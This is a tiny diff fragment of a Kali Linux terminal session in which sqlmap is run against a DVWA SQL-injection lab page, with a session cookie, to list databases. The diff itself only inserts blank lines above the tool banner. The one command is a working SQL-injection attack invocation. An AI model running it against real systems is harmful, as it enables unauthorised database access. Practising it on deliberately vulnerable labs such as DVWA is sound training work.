@@ -1,5 +1,7 @@
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap -u "http://192.168.0.73/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=de96e4cc5c7d00436c0292c8cb25d7c4" --dbs --batch
+
+    
         ___
        __H__
  ___ ___[']_____ ___ ___  {1.7.9#stable}
